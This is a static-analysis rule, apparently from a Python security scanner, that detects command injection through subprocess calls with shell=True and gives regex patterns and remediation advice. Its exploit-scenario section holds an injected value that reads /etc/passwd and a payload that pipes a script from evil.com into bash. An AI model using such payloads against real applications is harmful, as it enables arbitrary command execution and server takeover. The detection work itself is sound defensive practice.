- rule_id: PY-INJ-015
  title: subprocess shell=True with User Arguments
  description: 'Detects subprocess.run/call/Popen invocations with shell=True where command arguments are constructed from
    user-controlled input, enabling shell metacharacter injection even when the base command is hardcoded.

    '
  language: python
  category: injection
  severity: High
  confidence: 0.93
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - subprocess
  - shell-true
  - rce
  - python
  detection_layer: 1
  attack_surface_type: api
  patterns:
  - type: regex
    pattern: subprocess\.(?:run|call|Popen|check_output|check_call)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data|filename|path|host|url)\b[^)]*shell\s*=\s*True
    description: subprocess with f-string args and shell=True
  - type: regex
    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user|data|filename)[^)]*shell\s*=\s*True
    description: subprocess with concatenated args and shell=True
  - type: regex
    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*['"][^'"]*["']\s*%\s*(?:request|param|input|user|data)[^)]*shell\s*=\s*True
    description: subprocess with % formatted args and shell=True
  - type: regex
    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*(?:cmd|command|cmd_str)\b[^)]*shell\s*=\s*True
    description: subprocess with variable command and shell=True
  anti_patterns:
  - shell\s*=\s*False
  - subprocess\.run\s*\(\s*\[
  - shlex\.quote
  - shlex\.split
  - '# nosec'
  - test\s*\(
  - ALLOWED_COMMANDS
  bypass_variants:
  - description: Shell metacharacter injection
    pattern: ;[^;]*(?:cat|ls|wget|curl|nc|bash)\s+
  - description: Backtick substitution
    pattern: '`[^`]*(?:cat|ls|wget|curl|nc|bash)'
  evasion_indicators:
  - Shell metacharacter injection (; | & ` $())
  - Backtick command substitution
  - Newline injection in arguments
  encoding_variants:
  - type: url_encoding
    pattern: '%3b.*%7c'
  - type: hex
    pattern: \\x3b.*\\x7c
  multi_function_chain_patterns:
  - request.form['host'] -> f"ping -c 4 {host}" -> subprocess.run(cmd, shell=True)
  - request.args['file'] -> f"cat {file}" -> subprocess.check_output(cmd, shell=True)
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Arbitrary OS command execution via shell metacharacters
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: request.form, request.args
    sink: subprocess.run(cmd, shell=True)
    through: f-string or concatenation with user input
  impact: 'Command injection via subprocess with shell=True enables arbitrary OS

    command execution, full server compromise, and persistent backdoors.

    '
  remediation: '- Use subprocess.run(["cmd", "arg1", "arg2"]) with shell=False (default).

    - Pass arguments as a list, never as a concatenated string.

    - Use shlex.quote() if shell=True is unavoidable.

    - Use shlex.split() to safely parse command strings.

    '
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://docs.python.org/3/library/subprocess.html#security-considerations
  context_awareness:
    surrounding_context_patterns:
    - import subprocess
    - from subprocess import
    taint_source_indicators:
    - request.form
    - request.args
    - request.json
    - sys.argv
    taint_sink_indicators:
    - subprocess.run(
    - subprocess.call(
    - subprocess.Popen(
    - subprocess.check_output(
    sanitization_patterns:
    - shlex.quote(
    - shlex.split(
    - shell=False
    - ALLOWED_COMMANDS
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Flask app runs subprocess.run(f"nmap {request.form[''target'']}", shell=True).

      Attacker sends target="127.0.0.1; cat /etc/passwd" to read system files.

      '
    example_payload: 127.0.0.1; curl http://evil.com/shell.sh | bash
    attacker_objective: Execute arbitrary OS commands via subprocess shell injection
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
